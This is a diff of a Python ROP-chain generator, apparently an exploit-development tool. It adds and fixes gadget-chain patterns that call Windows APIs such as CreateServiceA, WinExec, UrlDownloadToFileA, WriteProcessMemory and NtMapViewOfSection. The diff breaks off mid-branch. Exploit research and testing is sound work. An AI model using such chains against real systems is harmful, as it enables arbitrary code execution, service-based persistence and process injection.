@@ -6520,6 +6520,7 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 
 	myParams=[]
 	myStrings=[]
+
 	if typePattern=="LoadLibrary":
 		s =distanceDict["targetDllString"]["loc1"]["String"] 
 		s+= "' + " +"'\\x00\\x00'\n"
@@ -6528,6 +6529,7 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(targetDll,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["targetDllString"]["distanceToPayload"]
+
 	elif typePattern=="GetProcAddress":
 		s =distanceDict["targetDllString"]["loc1"]["String"] 
 		s+= "' + " +"'\\x00\\x00'\n"
@@ -6540,6 +6542,7 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(targetDll + targetAPI,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["targetDllString"]["distanceToPayload"]
+
 	elif typePattern=="System":
 		s =distanceDict["targetDllString"]["loc1"]["String"] 
 		s+= "' + " +"'\\x00\\x00'\n"
@@ -6556,7 +6559,8 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(targetDll + targetAPI + command,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["targetDllString"]["distanceToPayload"]
-	elif typePattern=="WE":
+
+	elif typePattern=="WE": # WinExec
 		s =distanceDict["WinExec"]["loc1"]["String"] 
 		s+= "' + " +"'\\x00\\x00'\n"
 		s="cmdLine = " + "'"+s
@@ -6564,6 +6568,25 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(cmdLine,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["WinExec"]["distanceToPayload"]
+
+    # GPAWinExec
+	# elif typePattern=="WE":
+	# 	s=distanceDict["WinExec"]["loc1"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetDll = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s=distanceDict["WinExec"]["loc2"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetAPI = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s=distanceDict["WinExec"]["loc3"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="command = " + "'"+s
+	# 	myStrings.append(s)
+	# 	param="params=bytes(targetDll + targetAPI + command,'utf-8')\n"		
+	# 	myParams.append(param)
+	# 	dist=distanceDict["WinExec"]["distanceToPayload"]
+
 	elif typePattern=="DF":
 		s =distanceDict["DeleteFileA"]["loc1"]["String"] 
 		s+= "' + " +"'\\x00\\x00'\n"
@@ -6572,6 +6595,95 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(del_file,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["DeleteFileA"]["distanceToPayload"]
+
+	# GPADeleteFileA
+	# elif typePattern=="DF":
+	# 	s=distanceDict["DeleteFileA"]["loc1"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetDll = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s=distanceDict["DeleteFileA"]["loc2"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetAPI = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s=distanceDict["DeleteFileA"]["loc3"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="command = " + "'"+s
+	# 	myStrings.append(s)
+	# 	param="params=bytes(targetDll + targetAPI + command,'utf-8')\n"		
+	# 	myParams.append(param)
+	# 	dist=distanceDict["DeleteFileA"]["distanceToPayload"]
+
+	# GPAHeapCreate
+	# elif typePattern=="HeapCreate":
+	# 	s =distanceDict["HeapCreate"]["loc1"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetDll = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s =distanceDict["HeapCreate"]["loc2"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetAPI = " + "'"+s
+	# 	myStrings.append(s)
+	# 	param="params=bytes(targetDll + targetAPI,'utf-8')\n"		
+	# 	myParams.append(param)
+	# 	dist=distanceDict["HeapCreate"]["distanceToPayload"]
+
+	# GPAHeapAlloc
+	# elif typePattern=="HeapAlloc":
+	# 	s =distanceDict["HeapAlloc"]["loc1"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetDll = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s =distanceDict["HeapAlloc"]["loc2"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetAPI = " + "'"+s
+	# 	myStrings.append(s)
+	# 	param="params=bytes(targetDll + targetAPI,'utf-8')\n"		
+	# 	myParams.append(param)
+	# 	dist=distanceDict["HeapAlloc"]["distanceToPayload"]
+
+	# GPAWriteProcessMemory
+	# elif typePattern=="WriteProcessMemory":
+	# 	s =distanceDict["WriteProcessMemory"]["loc1"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetDll = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s =distanceDict["WriteProcessMemory"]["loc2"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetAPI = " + "'"+s
+	# 	myStrings.append(s)
+	# 	param="params=bytes(targetDll + targetAPI,'utf-8')\n"		
+	# 	myParams.append(param)
+	# 	dist=distanceDict["WriteProcessMemory"]["distanceToPayload"]
+
+	# GPAOpenSCManagerA
+	# elif typePattern=="OpenSCManagerA":
+	# 	s =distanceDict["OpenSCManagerA"]["loc1"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetDll = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s =distanceDict["OpenSCManagerA"]["loc2"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetAPI = " + "'"+s
+	# 	myStrings.append(s)
+	# 	param="params=bytes(targetDll + targetAPI,'utf-8')\n"		
+	# 	myParams.append(param)
+	# 	dist=distanceDict["OpenSCManagerA"]["distanceToPayload"]
+
+	# GPAShellExecuteA
+	# elif typePattern=="ShellExecuteA":
+	# 	s =distanceDict["ShellExecuteA"]["loc1"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetDll = " + "'"+s
+	# 	myStrings.append(s)
+	# 	s =distanceDict["ShellExecuteA"]["loc2"]["String"] 
+	# 	s+= "' + " +"'\\x00\\x00'\n"
+	# 	s="targetAPI = " + "'"+s
+	# 	myStrings.append(s)
+	# 	param="params=bytes(targetDll + targetAPI,'utf-8')\n"		
+	# 	myParams.append(param)
+	# 	dist=distanceDict["ShellExecuteA"]["distanceToPayload"]
+
 	elif typePattern=="RCKV" or typePattern=="RegCreateKeyA": 
 		s =distanceDict["RCKV"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
 		s="lpSubKey = " + "'"+s
@@ -6579,7 +6691,8 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(lpSubKey,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["RCKV"]["distanceToPayload"]
-	elif typePattern=="CreateServiceA" or typePattern=="CSA": 
+
+	elif typePattern=="CreateServiceA" or typePattern=="CSA":
 		s =distanceDict["CSA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
 		s="lpDisplayName = " + "'"+s
 		myStrings.append(s)
@@ -6592,13 +6705,38 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(lpDisplayName + lpBinaryPathName + lpServiceName,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["CSA"]["distanceToPayload"]
+
+	elif typePattern=="ExCreateServiceA" or typePattern=="ExCSA":
+		s =distanceDict["ExCSA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
+		s="targetDll = " + "'"+s
+		myStrings.append(s)
+		s =distanceDict["ExCSA"]["loc2"]["String"] + "' + " +"'\\x00\\x00'\n"
+		s="targetAPI = " + "'"+s
+		myStrings.append(s)
+		s =distanceDict["ExCSA"]["loc3"]["String"] + "' + " +"'\\x00\\x00'\n"
+		s="targetAPI2 = " + "'"+s
+		myStrings.append(s)
+		s =distanceDict["ExCSA"]["loc4"]["String"] + "' + " +"'\\x00\\x00'\n"
+		s="lpDisplayName = " + "'"+s
+		myStrings.append(s)
+		s =distanceDict["ExCSA"]["loc5"]["String"] + "' + " +"'\\x00\\x00'\n"
+		s="lpBinaryPathName = " + "'"+s
+		myStrings.append(s)
+		s =distanceDict["ExCSA"]["loc6"]["String"] + "' + " +"'\\x00\\x00'\n"
+		s="lpServiceName = " + "'"+s
+		myStrings.append(s)
+		param="params=bytes(targetDll + targetAPI + targetAPI2 + lpDisplayName + lpBinaryPathName + lpServiceName,'utf-8')\n"		
+		myParams.append(param)
+		dist=distanceDict["ExCSA"]["distanceToPayload"]
+
 	elif typePattern=="CreateProcessA" or typePattern=="CPA": 
 		s =distanceDict["CPA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"		
 		s="lpCommandLine = " + "'"+s
 		myStrings.append(s)
 		param="params=bytes(lpCommandLine,'utf-8')\n"		
 		myParams.append(param)
-		dist=distanceDict["CSA"]["distanceToPayload"]
+		dist=distanceDict["CPA"]["distanceToPayload"]
+
 	elif typePattern=="SEA" or typePattern=="ShellExecuteA":
 		s =distanceDict["SEA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
 		s="lpOperation = " + "'"+s
@@ -6609,6 +6747,7 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 		param="params=bytes(lpOperation  + lpFile,'utf-8')\n"		
 		myParams.append(param)
 		dist=distanceDict["SEA"]["distanceToPayload"]
+
 	elif typePattern=="UDTF" or typePattern=="UrlDownloadToFileA":
 		s =distanceDict["UDTF"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
 		s="szURL = " + "'"+s
@@ -6687,7 +6826,7 @@ def genOutput(myDict, typePattern=None, myDict2=None):
 
 		outP+=genCode3(False)
 		cOut+=whi+outP
-	elif typePattern =="OP" or typePattern =="OpenProcess" or typePattern =="CT32S" or typePattern =="P32F" or typePattern =="P32N" or typePattern =="WPM" or typePattern =="WriteProcessMemory" or typePattern =="HC" or typePattern =="HeapCreate" or typePattern =="CreateRemoteThread" or typePattern =="CRT" or typePattern =="VirtualAllocEx" or typePattern =="VAE" or typePattern =="TerminateProcess" or typePattern =="TP" or typePattern =="HC" or typePattern =="HeapCreate" or typePattern =="CreateRemoteThread":
+	elif typePattern =="OP" or typePattern =="OpenProcess" or typePattern =="CT32S" or typePattern =="P32F" or typePattern =="P32N" or typePattern =="WPM" or typePattern =="WriteProcessMemory" or typePattern =="HC" or typePattern =="HeapCreate" or typePattern =="CreateRemoteThread" or typePattern =="CRT" or typePattern =="VirtualAllocEx" or typePattern =="VAE" or typePattern =="TerminateProcess" or typePattern =="TP" or typePattern =="CreateRemoteThread" or typePattern=="HeapAlloc" or typePattern=="HA":
 		outP=genCode2(True)
 		outP+="startParams="+hex(dist)+"\n"
 		for s in myStrings:
@@ -11584,31 +11723,47 @@ def genPayload(val, patType=None):
 	elif patType=="DeleteFileA":
 		s =distanceDict["DeleteFileA"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
-	elif patType=="CSA":  #CreateServiceA
+
+	elif patType=="CSA":  # CreateServiceA
 		s =distanceDict["CSA"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
 		s2 =distanceDict["CSA"]["loc2"]["String"] 
-		payload+=bytes(s,'utf-8')+b'\x00\x00'
+		payload+=bytes(s2,'utf-8')+b'\x00\x00'
 		s3 =distanceDict["CSA"]["loc3"]["String"] 
-		payload+=bytes(s,'utf-8')+b'\x00\x00'
-	elif patType=="SEA":  #ShellExecuteA
+		payload+=bytes(s3,'utf-8')+b'\x00\x00'
+
+	elif patType=="ExCreateServiceA" or patType=="ExCSA":  # ExCreateServiceA
+		s =distanceDict["ExCSA"]["loc1"]["String"] 
+		payload=bytes(s,'utf-8')+b'\x00\x00'
+		s2 = distanceDict["ExCSA"]["loc2"]["String"] 
+		payload+=bytes(s2,'utf-8')+b'\x00\x00'
+		s3 =distanceDict["ExCSA"]["loc3"]["String"]
+		payload+=bytes(s3,'utf-8')+b'\x00\x00'
+		s4 =distanceDict["ExCSA"]["loc4"]["String"] 
+		payload+=bytes(s4,'utf-8')+b'\x00\x00'
+		s5 =distanceDict["ExCSA"]["loc5"]["String"] 
+		payload+=bytes(s5,'utf-8')+b'\x00\x00'
+		s6 =distanceDict["ExCSA"]["loc6"]["String"] 
+		payload+=bytes(s6,'utf-8')+b'\x00\x00'
+
+	elif patType=="SEA":  # ShellExecuteA
 		s =distanceDict["SEA"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
-	elif patType=="CPA":  #CreateProcessA
+	elif patType=="CPA":  # CreateProcessA
 		s =distanceDict["CPA"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
-	elif patType=="P32F":  #Process32First
+	elif patType=="P32F":  # Process32First
 		s =distanceDict["P32F"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
-	elif patType=="P32N":  #Process32Next
+	elif patType=="P32N":  # Process32Next
 		s =distanceDict["P32N"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
-	elif patType=="UDTF":  #UrlDownloadToFileA
+	elif patType=="UDTF":  # UrlDownloadToFileA
 		s =distanceDict["UDTF"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
 		s =distanceDict["UDTF"]["loc2"]["String"] 
 		payload+=bytes(s,'utf-8')+b'\x00\x00'
-	elif patType=="RSKV":  #CreateServiceA
+	elif patType=="RSKV":
 		s =distanceDict["RSKV"]["loc1"]["String"] 
 		payload=bytes(s,'utf-8')+b'\x00\x00'
 		s2 =distanceDict["RSKV"]["loc2"]["String"] 
@@ -11618,38 +11773,6 @@ def genPayload(val, patType=None):
 		payload=bytes(s,'utf-8')+b'\x00\x00'
 	return payload
 
-def deleteme():
-	if typePattern=="RCKV":
-		s =distanceDict["RegCreateKeyA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
-		s="lpSubKey = " + "'"+s
-		myStrings.append(s)
-		param="params=bytes(lpSubKey,'utf-8')"		
-		myParams.append(param)
-		dist=distanceDict["RegCreateKeyA"]["distanceToPayload"]
-	elif typePattern=="RSKV":
-		s =distanceDict["RegSetKeyValueA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
-		s="lpSubKey = " + "'"+s
-		myStrings.append(s)
-		param="params=bytes(lpSubKey,'utf-8')"		
-		myParams.append(param)
-		dist=distanceDict["RegSetKeyValueA"]["distanceToPayload"]
-	elif typePattern=="CreateServiceA":
-		s =distanceDict["CreateServiceA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
-		s="lpOperation = " + "'"+s
-		myStrings.append(s)
-		param="params=bytes(lpOperation,'utf-8')"		
-		myParams.append(param)
-		dist=distanceDict["CreateServiceA"]["distanceToPayload"]
-	elif typePattern=="ShellExecuteA":
-		s =distanceDict["ShellExecuteA"]["loc1"]["String"] + "' + " +"'\\x00\\x00'\n"
-		s="lpOperation = " + "'"+s
-		myStrings.append(s)
-		s =distanceDict["ShellExecuteA"]["loc2"]["String"] + "' + " +"'\\x00\\x00'\n"
-		s="lpFile = " + "'"+s
-		myStrings.append(s)
-		param="params=bytes(lpOperation  + lpFile,'utf-8')"		
-		myParams.append(param)
-		dist=distanceDict["ShellExecuteA"]["distanceToPayload"]
 def buildRopChainTempMore(gadgets,rValStr,patType=None):
 	# print ("buildRopChainTempMore", rValStr, patType)
 	payload=genPayload(rValStr,patType)
@@ -13466,8 +13589,150 @@ class getParamVals:
 	def get_lpCommandLine(self, name, excludeRegs, r, r2, bad, pk):
 		extra="ptr to str"
 		comment="lpCommandLine = \"calc\""
-
 		return True, 0x0,comment, extra
+	
+	def get_HA_RT(self, name, excludeRegs, r, r2, bad, pk):
+		HA_RT=0x0af0cd90
+		comment=""
+		foundLL=False
+		try:
+			HA_RT=dllDict["kernel32.dll"]["HeapAlloc"]
+			foundLL=True
+		except:
+			try:
+				HA_RT=dllDict["kernelbase.dll"]["HeapAlloc"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - HeapAlloc not found. 0x0af0cd90 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to HeapAlloc")
+			comment=" - Ptr to HeapAlloc"
+			return True, HA_RT,comment, ""
+		else:
+			return True,HA_RT," - Placeholder value, HeapAlloc not found", ""
+		return False, HA_RT, "HeapAlloc not Found", ""
+
+	def get_hHeap(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: point to handle from the HeapCreate
+		value=0xd11
+		comment=" - placeholder, simulated handle to the heap"
+		return True, value, comment, ""
+
+	def get_dwFlags(self, name, excludeRegs, r, r2, bad, pk):
+		comment=""
+		return True, 0x100, comment, ""
+		
+	def get_OPT_RT(self, name, excludeRegs, r, r2, bad, pk):
+		OPT_RT=0x0af0bd07
+		comment=""
+		foundLL=False
+		try:
+			OPT_RT=dllDict["Advapi32.dll"]["OpenProcessToken"]
+			foundLL=True
+		except:
+			try:
+				OPT_RT=dllDict["Advapi32.dll"]["OpenProcessToken"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - OpenProcessToken not found. 0x0af0bd07 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to OpenProcessToken")	
+			comment=" - Ptr to OpenProcessToken"
+			return True, OPT_RT,comment, ""
+		else:
+			return True,OPT_RT," - Placeholder value, OpenProcessToken not found", ""
+		return False, OPT_RT, "OpenProcessToken not Found", ""
+
+	def get_ATP_RT(self, name, excludeRegs, r, r2, bad, pk):
+		ATP_RT=0x0af0bd26
+		comment=""
+		foundLL=False
+		try:
+			ATP_RT=dllDict["Advapi32.dll"]["AdjustTokenPrivileges"]
+			foundLL=True
+		except:
+			try:
+				ATP_RT=dllDict["Advapi32.dll"]["AdjustTokenPrivileges"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - AdjustTokenPrivileges not found. 0x0af0bd26 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to AdjustTokenPrivileges")	
+			comment=" - Ptr to AdjustTokenPrivileges"
+			return True, ATP_RT,comment, ""
+		else:
+			return True,ATP_RT," - Placeholder value, AdjustTokenPrivileges not found", ""
+		return False, ATP_RT, "AdjustTokenPrivileges not Found", ""
+
+	def get_CFA_RT(self, name, excludeRegs, r, r2, bad, pk):
+		CFA_RT=0x0af0bd22
+		comment=""
+		foundLL=False
+		try:
+			CFA_RT=dllDict["kernel32.dll"]["CreateFileA"]
+			foundLL=True
+		except:
+			try:
+				CFA_RT=dllDict["kernelbase"]["CreateFileA"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - CreateFileA not found. 0x0af0bd22 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to CreateFileA")	
+			comment=" - Ptr to CreateFileA"
+			return True, CFA_RT,comment, ""
+		else:
+			return True,CFA_RT," - Placeholder value, CreateFileA not found", ""
+		return False, CFA_RT, "CreateFileA not Found", ""
+
+	def get_NtCS_RT(self, name, excludeRegs, r, r2, bad, pk):
+		NtCS_RT=0x0af0bd21
+		comment=""
+		foundLL=False
+		try:
+			NtCS_RT=dllDict["ntdll"]["NtCreateSection"]
+			foundLL=True
+		except:
+			try:
+				NtCS_RT=dllDict["ntdll"]["NtCreateSection"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - NtCreateSection not found. 0x0af0bd21 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to NtCreateSection")	
+			comment=" - Ptr to NtCreateSection"
+			return True, NtCS_RT,comment, ""
+		else:
+			return True,NtCS_RT," - Placeholder value, NtCreateSection not found", ""
+		return False, NtCS_RT, "NtCreateSection not Found", ""
+
+	def get_NtMVS_RT(self, name, excludeRegs, r, r2, bad, pk):
+		NtMVS_RT=0x0af0bd29
+		comment=""
+		foundLL=False
+		try:
+			NtMVS_RT=dllDict["ntdll"]["NtMapViewOfSection"]
+			foundLL=True
+		except:
+			try:
+				NtMVS_RT=dllDict["ntdll"]["NtMapViewOfSection"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment=" - NtMapViewOfSection not found. 0x0af0bd29 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to NtMapViewOfSection")	
+			comment=" - Ptr to NtMapViewOfSection"
+			return True, NtMVS_RT,comment, ""
+		else:
+			return True,NtMVS_RT," - Placeholder value, NtMapViewOfSection not found", ""
+		return False, NtMVS_RT, "NtMapViewOfSection not Found", ""
+
 
 pv=getParamVals()
 
@@ -13517,7 +13782,7 @@ def giveRegValsFromDictOld(dict,t,i):
 	ourLoc=pat[i][str(t)]["ourLoc"]
 	return r, rV,rExclude,r2,com,specialHandling, hasString, paramStr,hasPointer, structPointer, structType, structSize, ourLoc
 
-		# '8': {'r': 'eax', 'val': 'uExitCode', 'excluded':[], "r2":"",'com':'uExitCode','specHan':False, 'hasStr':False, 'parStr': None, 'hasPtr':False, 'strucP': False, 'strucT':None, 'strucS':None, 'loc':None}
+	# '8': {'r': 'eax', 'val': 'uExitCode', 'excluded':[], "r2":"",'com':'uExitCode','specHan':False, 'hasStr':False, 'parStr': None, 'hasPtr':False, 'strucP': False, 'strucT':None, 'strucS':None, 'loc':None}
 
 def giveMovDValsFromDict(curPat, t,i):
 	# '9': {'valStr': 'Test_Str_Name 1', 'val': 5, 'specialHandling':False, 'hasString':False, 'paramStr': None, 'hasPointer':False, 'structPointer': False, 'structType':None, 'structSize':None, 'ourLoc':None, 'com':'This is a test value'},
@@ -13558,7 +13823,6 @@ def addExRegs(excludeRegs, r):
 	return excludeRegs
 
 def buildPushadInner(bad,excludeRegs,winApi,apiNum,apiCode,pk1, completePKs,stopCode):
-	# print('buildPushadInner')
 	j=0
 	outputsTxt=[]
 	outputsPk=[]
@@ -13817,7 +14081,6 @@ def giveApiNum(winApi,j):
 	dp ("giveApiNum", winApi)
 	global curPat
 	j+=1
-	# winApi="GetProcAddress"
 	if winApi=="LoadLibrary":
 		apiNum=9
 		apiCode="LoLi"
@@ -13825,8 +14088,8 @@ def giveApiNum(winApi,j):
 		apiNum=11
 		apiCode="GPA"
 	elif winApi=="System":
-		apiNum=11
-		apiCode="SYS"		
+		apiNum=9
+		apiCode="SYS"
 	elif winApi=="HG":
 		apiNum=11
 		apiCode="HG32"
@@ -13880,6 +14143,10 @@ def giveApiNum(winApi,j):
 		apiNum=1
 		apiCode="CSA"
 		size=19
+	elif winApi=="ExCreateServiceA":
+		apiNum=1
+		apiCode="ExCSA"
+		size=19
 	elif winApi=="ShellExecuteA":
 		apiNum=1
 		apiCode="SEA"
@@ -13899,6 +14166,10 @@ def giveApiNum(winApi,j):
 		apiNum=1
 		apiCode="CPA"
 		size=16
+	elif winApi=="HeapAlloc":
+		apiNum=1
+		apiCode="HA"
+		size=9
 	elif winApi == "Test":
 		apiNum=1
 		apiCode="Test"
@@ -13926,8 +14197,6 @@ def buildPushad(bad, patType):
 	pk=[]
 	oldPat=""
 
-
-	# patType="GetProcAddress"
 	if patType=="GetProcAddress":
 		stopCode="GPA"
 		foundInner1, oldApiCode,pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
@@ -13947,13 +14216,192 @@ def buildPushad(bad, patType):
 				oldPat+=oldApiCode + " "
 				pkTemp=pkBuild([pk1,pk2])
 				pk=pkBuild([pkPA1,pkPA2])
-				# foundInner3, oldApiCode,pk3,pkPA3=buildPushadInner(bad,excludeRegs2,"System",9,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
 				foundInnerSys,outputsTxtSys,outputsTxtCSys, outputsPkSys=buildPushadInner(bad,excludeRegs2,"System",9,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
 				if foundInnerSys:
 					fgc.addsrSystem(fChainObj(outputsPkSys,outputsTxtSys,outputsTxtCSys))
-					printGadgetChain(outputsTxtSys, "sr_System")
+					printGadgetChain(outputsTxtSys, "System")
 
-					# oldPat+=oldApiCode + " "
+	elif patType=="WE": # WinExec
+		stopCode="WE"
+		foundInnerWE,outputsTxtWE, outputsTxtCWE,outputsPkWE=buildPushadInner(bad,excludeRegs2,"WE",10,"apiCode",pk,pk,stopCode)
+		if foundInnerWE:
+			printGadgetChain(outputsTxtWE, "WinExec")
+
+	# GPAWinExec
+	# elif patType=="WE": # WinExec
+	# 	stopCode="WE"
+	# 	foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+	# 	if foundInner1:
+	# 		oldPat+=oldApiCode + " "
+	# 		foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+	# 		if foundInner2:
+	# 			oldPat+=oldApiCode + " "
+	# 			pkTemp=pkBuild([pk1,pk2])
+	# 			pk=pkBuild([pkPA1,pkPA2])
+	# 			foundInnerWE,outputsTxtWE,outputsTxtCWE, outputsPkWE=buildPushadInner(bad,excludeRegs2,"WE",10,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
+	# 			if foundInnerWE:
+	# 				printGadgetChain(outputsTxtWE, "WinExec")
+
+	elif patType=="DF": # DeleteFileA
+		stopCode="DF"
+		foundInnerWE,outputsTxtWE, outputsTxtCWE,outputsPkWE=buildPushadInner(bad,excludeRegs2,"DF",17,"apiCode",pk,pk,stopCode)
+		if foundInnerWE:
+			printGadgetChain(outputsTxtWE, "DeleteFileA")
+
+	# GPADeleteFileA
+	# elif patType=="DF": # DeleteFileA
+	# 	stopCode="DF"
+	# 	foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+	# 	if foundInner1:
+	# 		oldPat+=oldApiCode + " "
+	# 		foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+	# 		if foundInner2:
+	# 			oldPat+=oldApiCode + " "
+	# 			pkTemp=pkBuild([pk1,pk2])
+	# 			pk=pkBuild([pkPA1,pkPA2])
+	# 			foundInnerDF,outputsTxtDF,outputsTxtCDF, outputsPkDF=buildPushadInner(bad,excludeRegs2,"DF",17,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
+	# 			if foundInnerDF:
+	# 				printGadgetChain(outputsTxtDF, "DeleteFileA")
+
+	elif patType == "HeapCreate":
+		stopCode="HC"
+		foundInnerHC,outputsTxtHC, outputsTxtCHC,outputsPkHC=buildPushadInner(bad,excludeRegs2,"HeapCreate",1,"apiCode",pk,pk,stopCode)
+		if foundInnerHC:
+			printGadgetChain(outputsTxtHC, "HeapCreate")
+
+	# GPAHeapCreate
+	# elif patType=="HeapCreate":
+	# 	stopCode="HC"
+	# 	foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+	# 	if foundInner1:
+	# 		oldPat+=oldApiCode + " "
+	# 		foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+	# 		if foundInner2:
+	# 			oldPat+=oldApiCode + " "
+	# 			pkTemp=pkBuild([pk1,pk2])
+	# 			pk=pkBuild([pkPA1,pkPA2])
+	# 			foundInnerHC,outputsTxtHC,outputsTxtCHC, outputsPkHC=buildPushadInner(bad,excludeRegs2,"HeapCreate",1,"apiCode",pkTemp,pkBuild([pkPA1,pkPA2]),stopCode)
+	# 			if foundInnerHC:
+	# 				printGadgetChain(outputsTxtHC, "HeapCreate")
+
+	# GPAHeapAlloc
+	# elif patType=="HeapAlloc":
+	# 	stopCode="HA"
+	# 	foundInner1,oldApiCode, pk1,pkPA1=buildPushadInner(bad,excludeRegs2,"LoadLibrary",9,"apiCode",pk,pk,stopCode)
+	# 	if foundInner1:
+	# 		oldPat+=oldApiCode + " "
+	# 		foundInner2, oldApiCode,pk2,pkPA2=buildPushadInner(bad,excludeRegs2,"GetProcAddress",11,"apiCode",pk1,pkBuild([pkPA1]),stopCode)
+	# 		if foundInner2:
+	# 			oldPat+=oldApiCode + " "
+	# 			pkTemp=pkBuild([pk1,pk2])
+	# 			pk=pkBuild([pkPA1,pkPA2])
+	# 			foundInner3, oldApiCode, pk3, pkPA3 = buildPushadInner(bad, excludeRegs2, "HeapCreate", 1, "apiCode", pkTemp, pkBuild([pkPA1, pkPA2]), stopCode)
+	# 			if foundInner3:
+	# 				oldPat += oldApiCode + " "
+	# 				pkTemp2 = pkBuild([pk1, pk2, pk3])
+	# 				foundInnerHA, outputsTxtHA, outputsTxtCHA, outputsPkHA = buildPushadInner(bad, excludeRegs2, "HeapAlloc", 1, "apiCode", pkTemp2, pkBuild([pkPA1, pkPA2, pkPA3]), stopCode)
+	# 				if foundInnerHA:
+	# 					printGadgetChain(outputsTxtHA, "HeapAlloc")
+
+	elif patType == "HeapAlloc":
+		stopCode="HA"
+		foundInnerHA,outputsTxtHA, outputsTxtCHA,outputsPkHA=buildPushadInner(bad,excludeRegs2,"HeapAlloc",1,"apiCode",pk,pk,stopCode)
+		if foundInnerHA:
+			printGadgetChain(outputsTxtHA, "HeapAlloc")
+
+	elif patType == "WriteProcessMemory":
+		stopCode="WPM"
